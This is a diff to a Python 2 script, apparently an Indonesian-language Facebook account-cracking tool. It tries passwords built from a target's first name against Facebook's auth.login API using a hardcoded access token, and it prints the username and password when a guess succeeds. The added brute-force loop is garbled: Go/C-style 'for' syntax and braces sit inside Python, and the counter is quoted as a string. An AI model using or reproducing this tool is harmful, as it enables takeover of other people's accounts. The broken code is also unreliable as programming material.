@@ -361,19 +361,21 @@ def mini():
                     menu_hack()
                 else:
                 
-                    
+                    for number := 0; number < 99999; number++ {
+                    pz2 = a['first_name'] + 'number'
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     y = json.load(data)
                     if 'access_token' in y:
-                    for i in range(99999):
-                    pz2 = a['first_name'] + 'i'
+                    
                         print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                         print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                         raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                         menu_hack()
+                        
                     else:
+                    }
                         if 'www.facebook.com' in y['error_msg']:
                             print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                             print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
